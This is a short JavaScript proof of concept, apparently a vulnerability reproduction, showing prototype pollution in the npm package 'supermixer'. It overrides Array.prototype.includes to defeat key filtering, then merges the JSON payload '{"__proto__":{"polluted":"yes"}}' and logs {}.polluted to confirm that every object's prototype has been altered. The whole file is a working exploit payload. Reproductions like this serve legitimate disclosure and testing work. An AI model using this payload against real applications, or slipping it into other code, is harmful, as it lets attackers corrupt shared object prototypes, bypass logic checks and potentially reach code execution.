Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"__proto__":{"polluted":"yes"}}';
mixer.merge({}, JSON.parse(payload));
console.log({}.polluted);